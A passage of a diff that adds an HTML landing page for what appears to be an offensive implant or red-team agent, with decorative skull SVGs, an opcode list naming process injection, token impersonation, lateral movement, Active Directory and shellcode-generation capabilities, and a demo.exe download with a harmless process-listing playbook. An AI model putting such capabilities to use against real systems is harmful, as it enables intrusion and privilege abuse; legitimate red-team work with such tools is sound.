.31-16.33,5.5,6.03,9.34,10.25,13.18,14.46.87-.53,1.75-1.07,2.62-1.6-.41-8.84-.81-17.68-1.16-25.28,6.93,2.99,12.53,7.59,15.95,6.32,4.34-1.61,6.9-7.98,10.24-12.31.6,2.55-.58,4.18-.64,5.86-.12,3.21.39,6.45.64,9.68,3.15-.29,6.43-.11,9.42-.97,12.93-3.68,13.22-15.18,12.66-24.86-1.27-22.23-3.41-44.52-6.97-66.49-3.58-22.08-4.92-45.08-18.37-64.77-9.57.98-3.07,19.89-17.19,15.67-1.49-9.55-2.98-19.16-4.53-29.16-6.84,1.59-11.57,2.69-16.31,3.79-4.2-4.66-8.64-7.45-13.44-8.38-11.82-2.29-22.18,2.16-32.02,8.39-14.26,9.02-28.29,17.83-46.88,14.32-6.02-1.14-13.54,1.78-19.44,4.71-15.17,7.55-30.3,14.63-47.29,14.66.81,4.74,1.63,9.55,2.68,15.73-11.95-2.82-13.16,3.49-12.69,11.25.3,4.92.63,9.84.98,14.76.44,6.26.91,12.52,1.37,18.79-1.04.15-2.07.3-3.11.44,2.31,2.6,4.63,5.2,8.85,9.94-5.37-1.84-7.97-2.73-11.61-3.98ZM899.52,741.63c-13.75,22.94-16.34,45.42-19.53,67.52-2.97,20.61-5.02,41.39-6.42,62.17-.6,8.85.55,18.12,2.83,26.69.82,3.07,7.12,5.36,11.32,6.4,1.07.27,4.21-5.38,5.39-8.67,1.01-2.84.57-6.19.96-12.18,6.83,9.4,11.94,16.42,18.7,25.74,2.69-6.69,4.32-10.74,5.94-14.79.67.02,1.34.04,2.02.05,1.32,8.55,2.64,17.1,4.25,27.46,5.38-4.58,9.48-8.08,12.85-10.94-.53,5.21-1.05,10.2-1.56,15.19,4.97-.04,9.99-.51,14.91-.03,7.12.69,14.18,2.1,21.27,3.11,2.41.34,4.94.9,7.27.5,17.77-3,35.52-6.15,53.25-9.41,2.13-.39,5-1.17,5.96-2.73,6.46-10.47,15.49-14.66,27.75-13.83,4.69.32,10.03-1.1,14.22-3.34,4.9-2.62,8.85-7,15.16-12.22q-15.15-2.45-11.17-14.02c5.56-2.76,9.51-3.51,11.36-5.9,3.33-4.31,4.65-10.22,8.14-14.34,8.67-10.25,8.43-15.22-1.36-21.51,1.28-9.84,3.12-19.1,3.36-28.4.09-3.55-2.65-8.21-5.55-10.57-5.01-4.07-8.19-7.56-4.85-14.29,1.08-2.18.5-5.2.58-6.3-6.4-.35-11.67.55-15.92-1.11-9.2-3.61-17.61-9.28-26.87-12.67-6.93-2.53-14.96-4.69-22.04-3.71-16.89,2.33-31.46-.21-44.46-12.01-5.22-4.74-11.9-9.8-18.45-10.68-10.83-1.45-24-12.05-32.74,4.56-.57,1.08-3.31,1.21-5.09,1.41-10.71,1.17-16.25,9.01-14.1,20.11.46,2.38.93,4.76,1.6,8.17-14.31-1.72-16.53-11.82-18.97-25.4ZM799.89,894.37c-.76.04-1.51.08-2.27.12-.66,2.37-1.38,4.72-1.97,7.1-4.84,19.69-8.17,39.9-14.82,58.95-9.51,27.22-21.77,53.46-32.01,80.45-1.69,4.45-.81,11.73,1.87,15.68,14.34,21.12,29.63,41.6,45.98,64.22,6.93-10.61,13.91-21.87,21.52-32.7,3.68-5.23,7.92-10.47,12.99-14.25,13.83-10.32,17.65-24.59,10.66-40.55-6.6-15.06-13.71-30.07-18.36-45.76-7.15-24.11-12.38-48.79-18.45-73.21-1.66-6.69-3.43-13.36-5.15-20.04ZM821.2,258.26c1.71-10.45-3.84-12.06-12.16-11.62-7.14.38-14.73,1.07-21.37-.89-5.02-1.48-9.48-4.65-12.58,1.03-3.04,5.59-7.91,13.99-5.83,17.84,5.58,10.33,14.09,19.22,22.27,27.89,1.81,1.92,7.44,1.72,10.65.6,16.89-5.86,15.38-22,19.01-34.85ZM1128.89,931.4c1.04.15,2.07.31,3.11.46.71-3.5.6-7.47,2.28-10.42,9.37-16.49,19.62-32.48,28.67-49.13,7.25-13.33,19.24-22.61,24.58-38.38,9.2-27.19,12.28-54.35,11.68-82.38-.37-17.1-1.9-34.17-2.92-51.25-.93-.04-1.85-.07-2.78-.11-.39,3.09-.97,6.18-1.13,9.28-1.46,28.73-.98,57.72-4.92,86.1-2.65,19.11-9.76,38.2-18.12,55.76-8.14,17.13-21.09,31.9-30.59,48.48-5.46,9.53-12.28,19.53-9.88,31.6ZM408.28,696.5c-2.86,3.27-3.67,3.77-3.79,4.4-10.23,51.99-8.23,102.69,18.84,149.73,13.44,23.35,29.06,45.45,43.69,68.12,1.22-2.58,1.5-5,.49-6.63-11.45-18.52-23.01-36.97-34.71-55.33-11.48-18.02-17.52-37.9-20.44-58.85-3.91-28.05-9.72-56.01-4.2-84.58.86-4.46.12-9.23.12-16.87ZM864.07,797.12c-1.16.04-2.32.08-3.49.13v78.35c1.16,0,2.32,0,3.49,0v-78.48ZM732.79,806.17c-.95-.1-1.89-.2-2.84-.3-2.05,22.18-2.72,44.28,2.68,66,1.7-.1,3.39-.21,5.09-.31-1.64-21.79-3.29-43.59-4.93-65.38ZM940.07,1224.1c0,12.14-.16,24.29.21,36.42.04,1.43,2.92,3.77,4.57,3.84,1.43.06,4.13-2.37,4.29-3.91,1.29-12.73,1.07-25.3-9.06-36.36ZM1120.82,953.73v34.73c9.1-13.37,9.43-23.91,0-34.73ZM1178.65,559.1c-1.38.19-2.75.38-4.13.57,1.46,13.03,2.91,26.06,4.37,39.08,1.45-.19,2.9-.37,4.36-.56-1.53-13.03-3.06-26.06-4.59-39.1ZM1088.96,1045.04c1.57.14,3.15.27,4.72.41,2.6-10.79,5.2-21.58,7.8-32.36-1.18-.28-2.35-.55-3.53-.83-2.45,11.05-9.33,21.14-9,32.79ZM1163.64,467c-1.4.76-2.79,1.53-4.19,2.29,4.64,7.6,9.28,15.2,13.92,22.8,1.14-.69,2.27-1.38,3.41-2.08-4.38-7.67-8.76-15.34-13.14-23.01Z"/>
+                        </svg>
+                    </div>
+
+                    <!-- EXE File Icon -->
+                    <div class="file-icon exe-icon">
+                        <div class="file-icon-body">
+                            <div class="file-icon-fold"></div>
+                            <span class="file-icon-label">.EXE</span>
+                        </div>
+                    </div>
+
+                    <!-- Skull 3 - Goes to DLL -->
+                    <div class="skull-agent skull-3">
+                        <div class="task-label">task_set 2</div>
+                        <svg viewBox="0 0 1600 1600">
+                            <path d="M1085.53,1087.87c-.51,6.79-1.19,13.58-1.48,20.38-.28,6.44.23,12.94-.31,19.35-.5,5.93-1.93,11.78-4.37,17.66-5.2-25.71-10.4-51.42-15.6-77.13-.99-.54-1.99-1.08-2.98-1.62-6.87,12.15-14.73,23.86-20.34,36.56-5.97,13.49-10.09,27.84-14.29,42.03-.69,2.33,1.56,7.03,3.82,8.47,11.54,7.33,12.54,17.34,9.91,29.49-1.32,6.11-.23,12.74-.23,20.34-2.8-6.27-5.09-11.39-8.64-19.35-12.53,19.08-25.94,34.56-33.37,52.53-5,12.09-1.37,27.69-1.92,41.71-.2,5.24-1.3,10.44-2.29,17.89-6.55-12.87-11.67-22.94-18.04-35.45-8.12,17-8.42,30.32-5.42,45.04,4.04,19.84-3.44,38.86-7.67,61.39-2.85-4.6-4.37-5.95-4.48-7.4-1.6-20.34-3.01-40.69-4.44-61.04-.51-7.2-.6-14.45-1.63-21.57-.34-2.36-3.02-4.39-4.62-6.57-2.37,1.98-6.98,4.21-6.79,5.9,3.26,29.05-10.53,57.86-1.15,86.96,1.1,3.4.8,7.26,1.19,11.36h-39.51c9.6-1.06,9.16-6.66,7.51-14.54-1.68-8.04-1.42-16.59-1.2-24.9.56-20.87,3.06-41.81,1.81-62.55-.7-11.51-7.3-22.68-11.55-33.88-.22-.59-3.33-.08-6.08-.08,5.47-9.21,10.47-17.61,16.66-28.01-14.43,1.45-19.41,9.57-23.35,18.46-3.05,6.88-5.32,14.1-7.88,21.19-.51,1.41-1.33,3.03-1.07,4.37,4.98,25.47-2.7,49.72-8.12,73.9-3.35,14.95-10.79,28.97-18.2,42.87,3.17-19.08,8.47-37.6,1.82-59.28-2.89,18.59-5.4,34.76-7.11,45.83,0-13.87-.22-32.72.05-51.57.39-27.88-16.46-54.39-45.74-52.61-31.67,1.92-46.4,15.89-46.77,48.11-.23,20.4-.04,40.79-.04,59.97-1.48-5.78-3.41-13.3-5.33-20.83-1.36-.02-2.72-.05-4.08-.07-.68,9.18-1.36,18.35-2.2,29.73-1.99-1.21-5.86-2.24-6.29-4.07-2.58-10.92-4.03-22.11-6.59-33.04-.92-3.93-4.89-7.18-5.69-11.11-5.19-25.42-9.29-50.86-8.54-77.12.57-20.21-8.2-29.89-26.97-33.39,6.82,12.86,13.04,24.6,19.26,36.34-.81.49-1.62.98-2.44,1.46-2.75-2.38-5.49-4.77-7.57-6.57-3.64,5.82-8.09,11.14-10.49,17.25-2.7,6.88-4.79,14.45-4.98,21.78-.68,25.46-.25,50.94-.71,76.41-.06,3.4-2.8,6.76-4.31,10.14-1.01-.54-2.02-1.07-3.02-1.61-1.19-20.53-2.37-41.06-3.56-61.59-1.32,0-2.64,0-3.97,0v60.32c-1.4.14-2.8.27-4.21.41-3.57-18.55-8.59-36.98-10.33-55.7-1.79-19.38-.4-39.05-.4-58.6,1.89-.17,3.78-.34,5.67-.5,2.78,15.19,5.56,30.38,8.35,45.56.35.06.71.12,1.06.18,0-12.14,1.78-24.63-.51-36.33-2.19-11.18-8.62-21.54-14.32-34.91-1.43,8.05-1.9,13.91-3.58,19.39-3.06,10.04-8.74,19.64-9.93,29.82-2.68,22.8-3.3,45.85-4.7,68.8-.18,2.97-.02,5.96-.02,9.34-11.04-.58-9.12-9.04-10.5-15.02-1.31-5.68-2.49-11.49-2.78-17.29-.23-4.7.06-9.79,1.65-14.14,5.44-14.88,1.15-35.68-11.13-45.43-.72,5.33-1.32,9.8-1.92,14.26-.64.18-1.28.36-1.92.54-1.13-3.89-2.79-7.71-3.31-11.68-1.65-12.61-1.65-25.58-4.65-37.83-2.58-10.51-8.69-19.75-20.33-23.82-2.77-.97-5.12-4.77-6.51-7.79-4.06-8.79-7.45-17.97-21.18-13.22-.24-.98-.47-1.97-.71-2.95,4.4-4.66,8.42-9.78,13.3-13.87,8.27-6.92,12.65-14.48,7.82-25.32-9.11-20.46-18.04-41-27.13-61.47-.58-1.3-1.8-2.31-3.48-4.41-1.64,3.13-2.89,5.52-3.39,6.48-3.88-3.43-8.05-7.13-14.11-12.5,1.48,13.84,1.45,23.72,3.8,33.01,3.26,12.9-5.76,22.79-6.68,34.53-.12,1.5-3.14,2.78-4.81,4.16-1.51-1.88-4.16-3.67-4.33-5.67-.57-6.8.15-13.7-.36-20.51-1.9-25.55-3.82-51.1-6.29-76.59-.94-9.7-3.38-19.25-5.14-28.87-1.26.17-2.51.34-3.77.51,1.19,11.98,2.39,23.96,3.57,35.95.94,9.45,1.47,18.96,2.91,28.33,1.6,10.35-5.31,12.5-12.6,13.11-26.58,2.23-26.6,2.01-46.91,14.79,1.5,1.8,2.93,3.52,5.15,6.18h-22.98c-2.74-9.41-5.31-18.23-8.09-27.81,14.22,4.71,12.46-7.87,14.17-13.64,4.54-15.31.7-22.61-12.37-27.1,1.54-7.82,5.01-16.01,4.35-23.86-1.85-22.1,4.9-42.03,12.65-61.93,9.44-24.23,4.91-44.39-16.76-59.99-7.59-5.46-14.75-11.51-22.76-17.81-1.5,2.87-2.61,4.99-3.16,6.04-3.07-11.44-6.31-23.52-9.64-35.95,5.35-.69,6.06-4.05,2.04-11.01-4.05-7.02-10.36-15.16.2-22.87,1.39-1.01.71-5,.8-7.62.47-14.05,1.25-28.12,1.1-42.17-.06-5.22-2.37-10.42-3.75-16,6.48,1.01,8.42-4.15,8.25-11.98-.35-16.12-.11-32.26-.11-49.2,9.81.18,12.26-6.64,11.96-16.31-.45-14.44-.25-28.89-.28-43.34-.03-14.38,0-28.75,0-43.06-5.99-1.93-9.43-3.04-14.94-4.81,17.12-5.25,11.56-19.21,12.53-29.01,1.61-16.17,11.53-27.34,17.87-40.75,5.17-10.92,6.72-23.56,9.89-35.43,1.34-5.01,2.26-10.19,4.24-14.93,1.08-2.59,5.94-4.61,5.74-6.55-1.83-18.39,14.73-27.61,20.33-42.15,1.16-3.01,1.57-6.31,2.79-9.28,1.49-3.61,3.27-7.14,5.29-10.49,4.1-6.82,8.52-13.44,12.65-20.23,4.57-7.53,7.67-16.5,13.76-22.43,9.32-9.08,20.64-16.1,31.68-24.42,9.17,11.93-6.59,18.49-5.52,28.29.41.23,1.29.95,1.5.79,23.82-17.95,47.89-35.58,70.96-54.45,2.89-2.36.39-11.3.39-15,4.96-4.6,10.15-7.75,12.97-12.36,6.14-10.01,7.6-10.52,15.24-1.65,11.47-.75,17.42-7.19,22.5-17.25,4.5-8.92,12.9-15.88,19.97-24.17,2.25,3.3,5.09,6.03,6.18,9.34,3.4,10.26,8.12,11.39,16.52,4.53,2.07-1.69,7.52.33,11.26,1.26,3.7.92,7.49,4.28,10.74,3.72,27.3-4.71,54.49-10.1,81.73-15.17,2.15-.4,5.35-.83,6.57.33,6.93,6.61,11.57,1.16,17.73-3.84,6.67,12.96,17,9.75,28.85,9.15,15.46-.78,31.17,4.65,46.86,6.75,5.46.73,11.17-.51,16.75-2.31,16.14,5.69,18.86,4.97,27.62-9.55,13.85,8.12,27.24,16.73,34.37,31.87,3.64,7.74,7.14,8.76,13.21,2.59,5.48-5.57,9.61-5.73,13.59,2.65,1.93,4.06,8.02,6.15,13.84,10.26-.26,27.53,26.18,36.53,44.66,51.6,9.71,7.92,21.28,13.57,32.09,20.29,2.28-7.19,4.32-13.61,6.38-20.14,23.95,9.01,31.56,28.36,37.7,48.82.54,1.79.54,4.9,1.51,5.22,15.53,5.17,13.5,20.37,18.38,31.58.74,1.7,1.24,4.91,2.03,4.97,17.79,1.29,13.03,17.47,18.08,27.08,1.01,1.92,1.29,5.24,2.71,5.77,12.35,4.62,10.58,16.16,9.61,24.42-1.84,15.62,3.22,27.74,12.22,39.46,8.83,11.49,12.31,24.79,11.47,39.18-.58,10.03,1.81,18.52,13.13,23.63-16.94,1.02-16.82,1.02-16.82,17.78,0,25.07.17,50.14-.42,75.2-.22,9.59,1.27,15.81,13.59,12.43-10.33,18.4-.23,35.82-.83,53.17-.06,1.77,6.27,3.76,10.42,6.08-17.75,5.95-5.04,18.79-6.34,28.54-.88,6.62,2.19,13.67,2.68,20.59,1.11,15.62,1.77,31.27,2.46,46.91.08,1.81-.28,4.29-1.45,5.4-12,11.33-9.78,26.68-12.13,43.19-4.56-12.9-9.54-9.88-15.5-3.08-10.92,12.47-22.52,24.34-33.33,36.91-2.14,2.49-3.31,7.26-2.63,10.49,2.74,12.93,6.62,25.61,9.58,38.5.96,4.19.72,8.75.43,13.1-.29,4.29-1.33,8.53-2.05,12.8.91.23,1.83.45,2.74.68,1.14-3.46,2.29-6.91,4.38-13.23,1.36,4.96,2.43,7.22,2.54,9.52.51,10.78.44,21.59,1.21,32.34.43,5.94,1.4,9.87-4.91,15.13-10.74,8.95-6.27,22.65-5.99,37.31,4.89-4.55,7.72-7.19,10.62-9.89,7.97,11.8,5.7,21.4-7.27,29.42,2.59,1.61,4.78,2.97,6.97,4.33.01.92.02,1.84.04,2.77-7.42.9-14.85,1.79-23.34,2.82,3.82-9.99,1.69-15.47-8.24-17.19-13.22-2.29-26.24-6.08-39.53-7.51-5.81-.63-12.07,2.99-18.12,4.69,5.35-13.59,10.69-27.17,16.03-40.76-1.33-.44-2.66-.87-3.99-1.31-9.51,12.21-15.93,25.43-12,42.08ZM483.69,839.21c-.64,19.05,7.79,26.63,23.11,22.07.59,3.32.29,7.14,1.92,9.75,5.13,8.18,5.55,13.92-5.46,16.94-1.29.35-2.67,6.85-1.82,7.46,3.46,2.49,7.7,3.99,11.79,5.51,14.26,5.29,33.49-.32,40.14,17.67,17.43,2.35,34.83,1.31,49.15,7.44,20.01,8.57,36.65-3.25,55.55-1.48-.46-5.79-.79-9.93-1.31-16.33,5.5,6.03,9.34,10.25,13.18,14.46.87-.53,1.75-1.07,2.62-1.6-.41-8.84-.81-17.68-1.16-25.28,6.93,2.99,12.53,7.59,15.95,6.32,4.34-1.61,6.9-7.98,10.24-12.31.6,2.55-.58,4.18-.64,5.86-.12,3.21.39,6.45.64,9.68,3.15-.29,6.43-.11,9.42-.97,12.93-3.68,13.22-15.18,12.66-24.86-1.27-22.23-3.41-44.52-6.97-66.49-3.58-22.08-4.92-45.08-18.37-64.77-9.57.98-3.07,19.89-17.19,15.67-1.49-9.55-2.98-19.16-4.53-29.16-6.84,1.59-11.57,2.69-16.31,3.79-4.2-4.66-8.64-7.45-13.44-8.38-11.82-2.29-22.18,2.16-32.02,8.39-14.26,9.02-28.29,17.83-46.88,14.32-6.02-1.14-13.54,1.78-19.44,4.71-15.17,7.55-30.3,14.63-47.29,14.66.81,4.74,1.63,9.55,2.68,15.73-11.95-2.82-13.16,3.49-12.69,11.25.3,4.92.63,9.84.98,14.76.44,6.26.91,12.52,1.37,18.79-1.04.15-2.07.3-3.11.44,2.31,2.6,4.63,5.2,8.85,9.94-5.37-1.84-7.97-2.73-11.61-3.98ZM899.52,741.63c-13.75,22.94-16.34,45.42-19.53,67.52-2.97,20.61-5.02,41.39-6.42,62.17-.6,8.85.55,18.12,2.83,26.69.82,3.07,7.12,5.36,11.32,6.4,1.07.27,4.21-5.38,5.39-8.67,1.01-2.84.57-6.19.96-12.18,6.83,9.4,11.94,16.42,18.7,25.74,2.69-6.69,4.32-10.74,5.94-14.79.67.02,1.34.04,2.02.05,1.32,8.55,2.64,17.1,4.25,27.46,5.38-4.58,9.48-8.08,12.85-10.94-.53,5.21-1.05,10.2-1.56,15.19,4.97-.04,9.99-.51,14.91-.03,7.12.69,14.18,2.1,21.27,3.11,2.41.34,4.94.9,7.27.5,17.77-3,35.52-6.15,53.25-9.41,2.13-.39,5-1.17,5.96-2.73,6.46-10.47,15.49-14.66,27.75-13.83,4.69.32,10.03-1.1,14.22-3.34,4.9-2.62,8.85-7,15.16-12.22q-15.15-2.45-11.17-14.02c5.56-2.76,9.51-3.51,11.36-5.9,3.33-4.31,4.65-10.22,8.14-14.34,8.67-10.25,8.43-15.22-1.36-21.51,1.28-9.84,3.12-19.1,3.36-28.4.09-3.55-2.65-8.21-5.55-10.57-5.01-4.07-8.19-7.56-4.85-14.29,1.08-2.18.5-5.2.58-6.3-6.4-.35-11.67.55-15.92-1.11-9.2-3.61-17.61-9.28-26.87-12.67-6.93-2.53-14.96-4.69-22.04-3.71-16.89,2.33-31.46-.21-44.46-12.01-5.22-4.74-11.9-9.8-18.45-10.68-10.83-1.45-24-12.05-32.74,4.56-.57,1.08-3.31,1.21-5.09,1.41-10.71,1.17-16.25,9.01-14.1,20.11.46,2.38.93,4.76,1.6,8.17-14.31-1.72-16.53-11.82-18.97-25.4ZM799.89,894.37c-.76.04-1.51.08-2.27.12-.66,2.37-1.38,4.72-1.97,7.1-4.84,19.69-8.17,39.9-14.82,58.95-9.51,27.22-21.77,53.46-32.01,80.45-1.69,4.45-.81,11.73,1.87,15.68,14.34,21.12,29.63,41.6,45.98,64.22,6.93-10.61,13.91-21.87,21.52-32.7,3.68-5.23,7.92-10.47,12.99-14.25,13.83-10.32,17.65-24.59,10.66-40.55-6.6-15.06-13.71-30.07-18.36-45.76-7.15-24.11-12.38-48.79-18.45-73.21-1.66-6.69-3.43-13.36-5.15-20.04ZM821.2,258.26c1.71-10.45-3.84-12.06-12.16-11.62-7.14.38-14.73,1.07-21.37-.89-5.02-1.48-9.48-4.65-12.58,1.03-3.04,5.59-7.91,13.99-5.83,17.84,5.58,10.33,14.09,19.22,22.27,27.89,1.81,1.92,7.44,1.72,10.65.6,16.89-5.86,15.38-22,19.01-34.85ZM1128.89,931.4c1.04.15,2.07.31,3.11.46.71-3.5.6-7.47,2.28-10.42,9.37-16.49,19.62-32.48,28.67-49.13,7.25-13.33,19.24-22.61,24.58-38.38,9.2-27.19,12.28-54.35,11.68-82.38-.37-17.1-1.9-34.17-2.92-51.25-.93-.04-1.85-.07-2.78-.11-.39,3.09-.97,6.18-1.13,9.28-1.46,28.73-.98,57.72-4.92,86.1-2.65,19.11-9.76,38.2-18.12,55.76-8.14,17.13-21.09,31.9-30.59,48.48-5.46,9.53-12.28,19.53-9.88,31.6ZM408.28,696.5c-2.86,3.27-3.67,3.77-3.79,4.4-10.23,51.99-8.23,102.69,18.84,149.73,13.44,23.35,29.06,45.45,43.69,68.12,1.22-2.58,1.5-5,.49-6.63-11.45-18.52-23.01-36.97-34.71-55.33-11.48-18.02-17.52-37.9-20.44-58.85-3.91-28.05-9.72-56.01-4.2-84.58.86-4.46.12-9.23.12-16.87ZM864.07,797.12c-1.16.04-2.32.08-3.49.13v78.35c1.16,0,2.32,0,3.49,0v-78.48ZM732.79,806.17c-.95-.1-1.89-.2-2.84-.3-2.05,22.18-2.72,44.28,2.68,66,1.7-.1,3.39-.21,5.09-.31-1.64-21.79-3.29-43.59-4.93-65.38ZM940.07,1224.1c0,12.14-.16,24.29.21,36.42.04,1.43,2.92,3.77,4.57,3.84,1.43.06,4.13-2.37,4.29-3.91,1.29-12.73,1.07-25.3-9.06-36.36ZM1120.82,953.73v34.73c9.1-13.37,9.43-23.91,0-34.73ZM1178.65,559.1c-1.38.19-2.75.38-4.13.57,1.46,13.03,2.91,26.06,4.37,39.08,1.45-.19,2.9-.37,4.36-.56-1.53-13.03-3.06-26.06-4.59-39.1ZM1088.96,1045.04c1.57.14,3.15.27,4.72.41,2.6-10.79,5.2-21.58,7.8-32.36-1.18-.28-2.35-.55-3.53-.83-2.45,11.05-9.33,21.14-9,32.79ZM1163.64,467c-1.4.76-2.79,1.53-4.19,2.29,4.64,7.6,9.28,15.2,13.92,22.8,1.14-.69,2.27-1.38,3.41-2.08-4.38-7.67-8.76-15.34-13.14-23.01Z"/>
+                        </svg>
+                    </div>
+
+                    <!-- DLL File Icon -->
+                    <div class="file-icon dll-icon">
+                        <div class="file-icon-body">
+                            <div class="file-icon-fold"></div>
+                            <span class="file-icon-label">.DLL</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="opcodes">
+        <div class="section-header">
+            <span class="section-number">04</span>
+            <span class="section-title">Opcode Reference</span>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="opcodes-section fade-in">
+            <h3>Available Operations</h3>
+            <div class="opcode-categories">
+                <div class="opcode-category">
+                    <h4>Control Flow</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">end</span>
+                        <span class="opcode-item">goto</span>
+                        <span class="opcode-item">conditional</span>
+                        <span class="opcode-item">sleep</span>
+                        <span class="opcode-item">create_thread</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Variables & Storage</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">store_result</span>
+                        <span class="opcode-item">set_var</span>
+                        <span class="opcode-item">get_const</span>
+                        <span class="opcode-item">print_var</span>
+                        <span class="opcode-item">check_error</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>File Operations</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">read_file</span>
+                        <span class="opcode-item">write_file</span>
+                        <span class="opcode-item">delete_file</span>
+                        <span class="opcode-item">get_cwd</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Execution</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">run_command</span>
+                        <span class="opcode-item">wmi_exec</span>
+                        <span class="opcode-item">shell_execute</span>
+                        <span class="opcode-item">shell_execute_explorer</span>
+                        <span class="opcode-item">shell_extract</span>
+                        <span class="opcode-item">pyexec</span>
+                        <span class="opcode-item">run_bof</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Process Injection</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">migrate</span>
+                        <span class="opcode-item">migrate_apc</span>
+                        <span class="opcode-item">hollow</span>
+                        <span class="opcode-item">hollow_apc</span>
+                        <span class="opcode-item">sacrificial</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Process Management</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">list_procs</span>
+                        <span class="opcode-item">impersonate_process</span>
+                        <span class="opcode-item">list_process_privs</span>
+                        <span class="opcode-item">list_thread_privs</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Token & Privileges</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">make_token</span>
+                        <span class="opcode-item">enable_privilege</span>
+                        <span class="opcode-item">revert_to_self</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Lateral Movement</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">psexec</span>
+                        <span class="opcode-item">wmi_exec</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Network</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">http_send</span>
+                        <span class="opcode-item">resolve_hostname</span>
+                        <span class="opcode-item">portscan</span>
+                        <span class="opcode-item">shellcode_server</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Active Directory</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">query_ldap</span>
+                        <span class="opcode-item">set_ad_attr_str</span>
+                        <span class="opcode-item">set_ad_attr_bin</span>
+                        <span class="opcode-item">create_rbcd_ace</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>User Management</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">set_user_password</span>
+                        <span class="opcode-item">get_user_sid</span>
+                        <span class="opcode-item">add_user_to_group</span>
+                        <span class="opcode-item">remove_user_from_group</span>
+                        <span class="opcode-item">add_user_to_localgroup</span>
+                        <span class="opcode-item">remove_user_from_localgroup</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Registry</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">reg_create_key</span>
+                        <span class="opcode-item">reg_delete_key</span>
+                        <span class="opcode-item">reg_set_value</span>
+                        <span class="opcode-item">reg_query_value</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Services</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">start_service</span>
+                        <span class="opcode-item">delete_service</span>
+                        <span class="opcode-item">register_service</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>Payload Generation</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">get_shellcode</span>
+                        <span class="opcode-item">generate_exe</span>
+                        <span class="opcode-item">generate_dll</span>
+                        <span class="opcode-item">load_library</span>
+                    </div>
+                </div>
+                <div class="opcode-category">
+                    <h4>I/O</h4>
+                    <div class="opcode-list">
+                        <span class="opcode-item">redirect_stdout</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="demo">
+        <div class="section-header">
+            <span class="section-number">05</span>
+            <span class="section-title">Demo</span>
+            <div class="section-line"></div>
+        </div>
+
+        <div class="demo-section fade-in">
+            <div class="demo-download">
+                <h3>Try Agent</h3>
+                <p>
+                    Download a sample executable that demonstrates basic Agent functionality. 
+                    This demo lists running processes after a short delay.
+                </p>
+                <a href="/demo.exe" class="download-btn" download>
+                    <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                    Download demo.exe
+                </a>
+                <p class="demo-warning">⚠ Windows x64 only. Run in a safe environment.</p>
+            </div>
+
+            <div class="demo-playbook">
+                <div class="terminal-header">
+                    <div class="terminal-dot red"></div>
+                    <div class="terminal-dot yellow"></div>
+                    <div class="terminal-dot green"></div>
+                    <span class="terminal-title">demo_playbook.json</span>
+                </div>
+                <div class="terminal-body">
+<pre>{
+  <span class="string">"constants"</span>: [
+    <span class="string">"Listing processes in 5 seconds..."</span>
+  ],
+  <span class="string">"task_sets"</span>: {
+    <span class="string">"0"</span>: [
+      { <span class="string">"op"</span>: <span class="string">"get_const"</span>, <span class="string">"index"</span>: <span class="number">0</span> },
+      { <span class="string">"op"</span>: <span class="string">"print_var"</span> },
+      { <span class="string">"op"</span>: <span class="string">"sleep"</span>, <span class="string">"ms"</span>: <span class="number">5000</span> },
+      { <span class="string">"op"</span>: <span class="string">"list_procs"</span> },
+      { <span class="string">"op"</span>: <span class="string">"print_var"</span> }
+    ]
+  }
+}</pre>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-logo">AGENT</div>
+        <p class="footer-copy">© 2025 ACE RESPONDER // ALL SYSTEMS OPERATIONAL</p>
+    </footer>
+
+    <script>
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+
+        window.addEventListener('scroll', () => {
+            const scrolled = window.pageYOffset;
+            const hero = document.querySelector('.hero-content');
+            if (hero && scrolled < window.innerHeight) {
+                hero.style.transform = `translateY(${scrolled * 0.3}px)`;
+                hero.style.opacity = 1 - (scrolled / window.innerHeight);
+            }
+        });
+    </script>
+</body>
+</html>
